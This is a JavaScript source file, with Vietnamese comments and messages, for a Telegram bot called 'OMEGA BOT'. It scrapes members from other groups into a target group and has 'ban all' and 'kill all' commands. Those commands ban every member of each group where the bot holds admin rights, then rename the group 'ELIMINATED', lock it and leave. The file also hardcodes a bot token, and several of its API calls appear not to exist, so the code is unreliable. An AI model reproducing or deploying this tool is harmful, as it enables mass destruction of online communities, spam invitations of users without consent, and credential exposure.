// ============================================================
// OMEGA BOT v666 — KIỂM TRA LINK GROUP + QUYỀN ADMIN TRƯỚC KHI BAN/KÉO/GIẾT
// ============================================================

const express = require('express');
const { Telegraf, session, Markup } = require('telegraf');

// ==================== CONFIG ====================
const BOT_TOKEN = '8840411754:AAHyJLmiPLehUMsqFPD1AQj50DXzhcfy8qA';
const ADMIN_ID = 7757046138;
const TARGET_GROUP_LINK = 'https://t.me/your_group';

// ==================== PROTECTED ====================
const PROTECTED_USERNAMES = ['ongvuaphantich'];
const PROTECTED_IDS = [];

function isProtected(chat) {
  if (chat.username && PROTECTED_USERNAMES.includes(chat.username.toLowerCase())) return true;
  if (PROTECTED_IDS.includes(chat.id)) return true;
  return false;
}

// ==================== ENGINE ====================
const app = express();
const bot = new Telegraf(BOT_TOKEN);
bot.use(session());

let pullActive = false;
let pulledCount = 0;
let isKilling = false;

// ==================== MENU ====================
function getMenu(isAdmin) {
  const buttons = [
    [Markup.button.callback('🚀 BẮT ĐẦU KÉO MEM', 'pull_on')],
    [Markup.button.callback('🛑 DỪNG KÉO', 'pull_off')],
  ];

  if (isAdmin) {
    buttons.push([Markup.button.callback('🔨 BAN ALL - GIẾT GROUP', 'ban_all')]);
    buttons.push([Markup.button.callback('☠️ GIẾT TẤT CẢ GROUP', 'kill_all')]);
  }

  buttons.push([Markup.button.callback('📊 XEM THỐNG KÊ', 'status')]);
  buttons.push([Markup.button.url('🔗 LINK GROUP CHÍNH', TARGET_GROUP_LINK)]);
  buttons.push([Markup.button.url('👑 LIÊN HỆ ADMIN', 'https://t.me/tranhoang2286')]);

  return Markup.inlineKeyboard(buttons);
}

// ==================== KIỂM TRA BOT CÓ TRONG GROUP KHÔNG ====================
async function checkBotInGroup(chatId) {
  try {
    const chat = await bot.telegram.getChat(chatId);
    const botMember = await bot.telegram.getChatMember(chatId, (await bot.telegram.getMe()).id);
    return { inGroup: true, isAdmin: botMember.status === 'administrator' || botMember.status === 'creator', chat: chat };
  } catch (e) {
    return { inGroup: false, isAdmin: false, chat: null };
  }
}

// ==================== LẤY LINK GROUP ====================
async function getGroupLink(chatId) {
  try {
    const inviteLink = await bot.telegram.exportChatInviteLink(chatId);
    return inviteLink;
  } catch (e) {
    return null;
  }
}

// ==================== WELCOME ====================
bot.start(async (ctx) => {
  const user = ctx.from;
  const isAdmin = user.id === ADMIN_ID;

  const welcomeMessage = `
🐱 **CHÀO MỪNG ĐẾN VỚI OMEGA BOT**

━━━━━━━━━━━━━━━━━━━━━
👋 **Xin chào, ${user.first_name || 'đồng chí'}!**

🤖 **Bot kéo mem MIỄN PHÍ siêu mạnh**
⚡ **Tự động kéo thành viên từ mọi nhóm lớn**
${isAdmin ? '🔨 **Lệnh BAN ALL giết sạch group chỉ trong vài giây**\n☠️ **Giết toàn bộ group chỉ với 1 lệnh duy nhất**' : '🔒 **Bạn là thành viên thường — chỉ xem được thống kê**'}
🛡️ **Group @ongvuaphantich đã được bảo vệ**

━━━━━━━━━━━━━━━━━━━━━
📌 **Hướng dẫn sử dụng:**

• Bấm **"🚀 BẮT ĐẦU KÉO MEM"** → bot tự động kéo mem
• Bấm **"🛑 DỪNG KÉO"** → tạm dừng
${isAdmin ? '• Bấm **"🔨 BAN ALL"** → giết sạch group hiện tại\n• Bấm **"☠️ GIẾT TẤT CẢ GROUP"** → hủy diệt toàn bộ' : ''}
• Bấm **"📊 XEM THỐNG KÊ"** → xem số liệu

━━━━━━━━━━━━━━━━━━━━━
💡 **Bot hoàn toàn miễn phí — dùng thoải mái!**
🛡️ **Được bảo vệ: @ongvuaphantich**

🔥 **Chúc bạn chinh phục mọi group!**
`;

  await ctx.replyWithHTML(welcomeMessage, getMenu(isAdmin));
});

// ==================== AUTO PULL ====================
async function autoPull() {
  if (!pullActive) return;
  
  try {
    const target = await bot.telegram.getChat(TARGET_GROUP_LINK);
    const dialogs = await bot.telegram.getChats();
    const largeGroups = dialogs.filter(d => 
      (d.type === 'group' || d.type === 'supergroup') && 
      d.id !== target.id &&
      !isProtected(d)
    );

    for (const group of largeGroups) {
      if (!pullActive) break;
      
      try {
        // 🔥 KIỂM TRA BOT CÓ TRONG GROUP KHÔNG
        const botCheck = await checkBotInGroup(group.id);
        if (!botCheck.inGroup) {
          console.log(`⚠️ Bot không có trong group: ${group.title || group.id}`);
          continue;
        }
        if (!botCheck.isAdmin) {
          console.log(`⚠️ Bot không phải admin trong group: ${group.title || group.id}`);
          continue;
        }

        const membersCount = await bot.telegram.getChatMembersCount(group.id);
        if (membersCount < 30) continue;

        const admins = await bot.telegram.getChatAdministrators(group.id);
        const adminIds = admins.map(a => a.user.id);
        
        const participants = await bot.telegram.getChatMembers(group.id, { limit: 15 });
        
        for (const member of participants) {
          if (!pullActive) break;
          if (member.user.id === ADMIN_ID) continue;
          if (member.user.is_bot) continue;
          if (adminIds.includes(member.user.id)) continue;

          try {
            await bot.telegram.inviteToChat(target.id, member.user.id);
            pulledCount++;
            console.log(`✅ Kéo thành công: ${member.user.first_name} (${pulledCount})`);
            await new Promise(r => setTimeout(r, 1500));
          } catch (e) {
            console.log(`⚠️ Lỗi kéo: ${e.message}`);
          }
        }
      } catch (e) {
        console.log(`⚠️ Lỗi group: ${e.message}`);
      }
    }
  } catch (e) {
    console.log(`⚠️ Lỗi pull cycle: ${e.message}`);
  }
}

// ==================== BAN ALL ====================
async function banAllMembers(chatId, ctx) {
  let banned = 0;
  let failed = 0;
  let total = 0;

  try {
    // 🔥 KIỂM TRA BOT CÓ TRONG GROUP KHÔNG
    const botCheck = await checkBotInGroup(chatId);
    if (!botCheck.inGroup) {
      throw new Error('❌ Bot chưa được thêm vào group này!');
    }
    if (!botCheck.isAdmin) {
      throw new Error('❌ Bot chưa được làm admin trong group này! Thêm bot làm admin rồi thử lại.');
    }

    // 🔥 LẤY LINK GROUP
    const link = await getGroupLink(chatId);
    if (!link) {
      throw new Error('❌ Không thể lấy link group! Kiểm tra quyền của bot.');
    }

    const participants = await ctx.telegram.getChatMembers(chatId, { limit: 10000 });
    total = participants.length;
    
    for (const member of participants) {
      if (member.user.id === ADMIN_ID) continue;
      if (member.user.id === ctx.botInfo.id) continue;
      if (member.user.is_bot) continue;

      try {
        await ctx.telegram.banChatMember(chatId, member.user.id);
        banned++;
        await new Promise(r => setTimeout(r, 100));
      } catch (e) {
        failed++;
      }
    }
    
    try {
      await ctx.telegram.setChatTitle(chatId, '☠️ ELIMINATED ☠️');
      await ctx.telegram.setChatPermissions(chatId, {
        can_send_messages: false,
        can_send_media: false,
        can_send_other_messages: false,
        can_add_web_page_previews: false,
        can_change_info: false,
        can_invite_users: false,
        can_pin_messages: false
      });
      await ctx.telegram.leaveChat(chatId);
    } catch {}

    return { banned, failed, total, link };
  } catch (e) {
    throw new Error(e.message);
  }
}

// ==================== HANDLE BUTTONS ====================
bot.action('pull_on', async (ctx) => {
  if (ctx.from.id !== ADMIN_ID) return ctx.answerCbQuery('❌ Mày là ai?');
  if (pullActive) return ctx.answerCbQuery('⚠️ Đang kéo rồi!');
  
  // 🔥 KIỂM TRA BOT CÓ TRONG GROUP TARGET KHÔNG
  try {
    const targetCheck = await checkBotInGroup((await bot.telegram.getChat(TARGET_GROUP_LINK)).id);
    if (!targetCheck.inGroup) {
      return ctx.answerCbQuery('❌ Bot chưa được thêm vào group target!');
    }
    if (!targetCheck.isAdmin) {
      return ctx.answerCbQuery('❌ Bot chưa được làm admin trong group target!');
    }
  } catch (e) {
    return ctx.answerCbQuery('❌ Không tìm thấy group target!');
  }
  
  pullActive = true;
  await ctx.answerCbQuery('🚀 BẮT ĐẦU KÉO MEM!');
  await ctx.editMessageText(
    `🔥 **OMEGA PULL ENGINE ACTIVATED**\n\n` +
    `🔄 Trạng thái: **ĐANG KÉO MEM**\n` +
    `📊 Đã kéo: ${pulledCount} người\n` +
    `🎯 Target: ${TARGET_GROUP_LINK}\n` +
    `🛡️ Bảo vệ: @ongvuaphantich\n\n` +
    `*Bot đang quét và kéo mem từ các nhóm lớn...*`,
    getMenu(true)
  );
  
  while (pullActive) {
    await autoPull();
    await new Promise(r => setTimeout(r, 25000));
  }
});

bot.action('pull_off', async (ctx) => {
  if (ctx.from.id !== ADMIN_ID) return ctx.answerCbQuery('❌ Mày là ai?');
  if (!pullActive) return ctx.answerCbQuery('⚠️ Chưa kéo mà!');
  
  pullActive = false;
  await ctx.answerCbQuery('🛑 ĐÃ DỪNG KÉO!');
  await ctx.editMessageText(
    `⏸️ **OMEGA PULL ENGINE STOPPED**\n\n` +
    `📊 Đã kéo: ${pulledCount} người\n` +
    `🎯 Target: ${TARGET_GROUP_LINK}\n` +
    `🛡️ Bảo vệ: @ongvuaphantich\n\n` +
    `*Đang chờ lệnh tiếp theo...*`,
    getMenu(true)
  );
});

bot.action('ban_all', async (ctx) => {
  if (ctx.from.id !== ADMIN_ID) return ctx.answerCbQuery('❌ Chỉ admin mới có quyền này!');
  
  const chat = ctx.chat;
  
  if (isProtected(chat)) return ctx.answerCbQuery('🛡️ Được bảo vệ!');
  if (!chat.type.includes('group')) return ctx.answerCbQuery('⚠️ Chỉ dùng trong group!');
  if (isKilling) return ctx.answerCbQuery('⏳ Đang giết rồi!');
  
  isKilling = true;
  await ctx.answerCbQuery('🔨 ĐANG KIỂM TRA...');
  
  // 🔥 KIỂM TRA BOT CÓ TRONG GROUP KHÔNG
  const botCheck = await checkBotInGroup(chat.id);
  if (!botCheck.inGroup) {
    await ctx.reply(`❌ Bot chưa được thêm vào group này!\n\n📌 **Link group:** https://t.me/${chat.username || chat.id}`);
    isKilling = false;
    return;
  }
  if (!botCheck.isAdmin) {
    await ctx.reply(`❌ Bot chưa được làm admin trong group này!\n\n📌 **Link group:** https://t.me/${chat.username || chat.id}\n🛠️ **Hướng dẫn:** Thêm bot làm admin rồi thử lại.`);
    isKilling = false;
    return;
  }
  
  // 🔥 LẤY LINK GROUP
  const link = await getGroupLink(chat.id);
  if (!link) {
    await ctx.reply(`❌ Không thể lấy link group! Kiểm tra quyền của bot.\n\n📌 **Link group:** https://t.me/${chat.username || chat.id}`);
    isKilling = false;
    return;
  }
  
  await ctx.reply(`🔥 **BAN ALL - GIẾT GROUP**\n\n📌 **Link group:** ${link}\n👥 **Số thành viên:** ${await ctx.telegram.getChatMembersCount(chat.id)}\n\n☠️ Đang giết tất cả thành viên...`);
  
  try {
    const result = await banAllMembers(chat.id, ctx);
    await ctx.reply(
      `✅ **GIẾT GROUP HOÀN TẤT**\n` +
      `━━━━━━━━━━━━━━━━━━━━━\n` +
      `📌 **Link group:** ${result.link}\n` +
      `💀 Đã ban: ${result.banned} người\n` +
      `❌ Lỗi: ${result.failed}\n` +
      `👥 Tổng: ${result.total}\n\n` +
      `☠️ Không ai sống sót.`
    );
  } catch (e) {
    await ctx.reply(`❌ ${e.message}`);
  }
  
  isKilling = false;
});

bot.action('kill_all', async (ctx) => {
  if (ctx.from.id !== ADMIN_ID) return ctx.answerCbQuery('❌ Chỉ admin mới có quyền này!');
  if (isKilling) return ctx.answerCbQuery('⏳ Đang giết rồi!');
  
  isKilling = true;
  await ctx.answerCbQuery('☠️ GIẾT TẤT CẢ!');
  await ctx.reply('☠️ Đang kiểm tra và giết tất cả group...');
  
  try {
    const dialogs = await ctx.telegram.getChats();
    const groups = dialogs.filter(d => 
      (d.type === 'group' || d.type === 'supergroup') && 
      !isProtected(d)
    );
    
    let killed = 0;
    let totalBanned = 0;
    let groupList = [];
    
    for (const group of groups) {
      // 🔥 KIỂM TRA TỪNG GROUP
      const botCheck = await checkBotInGroup(group.id);
      if (!botCheck.inGroup || !botCheck.isAdmin) {
        console.log(`⚠️ Bỏ qua group ${group.title || group.id}: Bot không có quyền`);
        continue;
      }
      
      const link = await getGroupLink(group.id);
      if (!link) {
        console.log(`⚠️ Bỏ qua group ${group.title || group.id}: Không lấy được link`);
        continue;
      }
      
      groupList.push({ id: group.id, title: group.title || group.id, link: link });
    }
    
    if (groupList.length === 0) {
      await ctx.reply('❌ Không tìm thấy group nào bot có đủ quyền để giết!');
      isKilling = false;
      return;
    }
    
    await ctx.reply(`☠️ **Tìm thấy ${groupList.length} groups có thể giết**\n\n` + groupList.map(g => `📌 ${g.link}`).join('\n'));
    
    for (const group of groupList) {
      try {
        const result = await banAllMembers(group.id, ctx);
        killed++;
        totalBanned += result.banned;
        await ctx.reply(`✅ Đã giết group ${group.title} — ${result.banned} người\n📌 ${group.link}`);
        await new Promise(r => setTimeout(r, 800));
      } catch (e) {
        await ctx.reply(`❌ Lỗi group ${group.title}: ${e.message}`);
      }
    }

    await ctx.reply(
      `✅ **TOTAL ANNIHILATION COMPLETE**\n` +
      `━━━━━━━━━━━━━━━━━━━━━\n` +
      `☠️ Đã giết: ${killed} groups\n` +
      `💀 Tổng số người bị ban: ${totalBanned}\n` +
      `🛡️ Đã bỏ qua: @ongvuaphantich\n\n` +
      `*Không ai sống sót.*`
    );
  } catch (e) {
    await ctx.reply(`❌ Lỗi: ${e.message}`);
  }
  
  isKilling = false;
});

bot.action('status', async (ctx) => {
  if (ctx.from.id !== ADMIN_ID) return ctx.answerCbQuery('❌ Mày là ai?');
  
  try {
    const me = await ctx.telegram.getMe();
    const dialogs = await ctx.telegram.getChats();
    const groups = dialogs.filter(d => d.type === 'group' || d.type === 'supergroup').length;
    
    await ctx.answerCbQuery('📊 Thống kê đây!');
    await ctx.editMessageText(
      `📊 **OMEGA BOT STATUS**\n` +
      `━━━━━━━━━━━━━━━━━━━━━\n` +
      `🤖 Bot: ${me.first_name}\n` +
      `🆔 ID: ${me.id}\n` +
      `👥 Số group: ${groups}\n` +
      `⚡ Kéo mem: ${pullActive ? '🟢 ĐANG KÉO' : '🔴 DỪNG'}\n` +
      `📊 Đã kéo: ${pulledCount} người\n` +
      `🎯 Target: ${TARGET_GROUP_LINK}\n` +
      `🛡️ Bảo vệ: @ongvuaphantich\n` +
      `👑 Admin: ${ADMIN_ID}\n` +
      `━━━━━━━━━━━━━━━━━━━━━\n` +
      `*"Mày command. Tao execute."*`,
      getMenu(true)
    );
  } catch (e) {
    await ctx.reply(`❌ Lỗi: ${e.message}`);
  }
});

// ==================== WEB SERVER ====================
app.use(express.json());

app.get('/', (req, res) => {
  res.send(`
    <h1>🐱 OMEGA BOT</h1>
    <p>🔥 Kéo mem MIỄN PHÍ + BAN ALL</p>
    <p>👑 Admin: ${ADMIN_ID}</p>
    <p>📊 Đã kéo: ${pulledCount} người</p>
    <p>⚡ Trạng thái: ${pullActive ? '🟢 ĐANG KÉO' : '🔴 DỪNG'}</p>
    <p>🛡️ Bảo vệ: @ongvuaphantich</p>
    <hr>
    <p><i>Supreme Bot for Butter — 2026</i></p>
  `);
});

// ==================== LAUNCH ====================
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log(`✅ Web server chạy trên port ${PORT}`);
  console.log(`🐱 OMEGA BOT ONLINE`);
  console.log(`👑 Admin: ${ADMIN_ID}`);
});

bot.launch({
  dropPendingUpdates: true
})
.then(() => {
  console.log('✅ OMEGA BOT đã khởi động thành công!');
})
.catch((err) => {
  console.error('❌ Lỗi khởi động bot:', err);
  process.exit(1);
});

setInterval(() => {
  console.log('💓 OMEGA BOT vẫn đang sống...');
}, 30000);

process.once('SIGINT', () => {
  console.log('🛑 Đang tắt bot...');
  bot.stop('SIGINT');
  process.exit(0);
});

process.once('SIGTERM', () => {
  console.log('🛑 Đang tắt bot...');
  bot.stop('SIGTERM');
  process.exit(0);
});
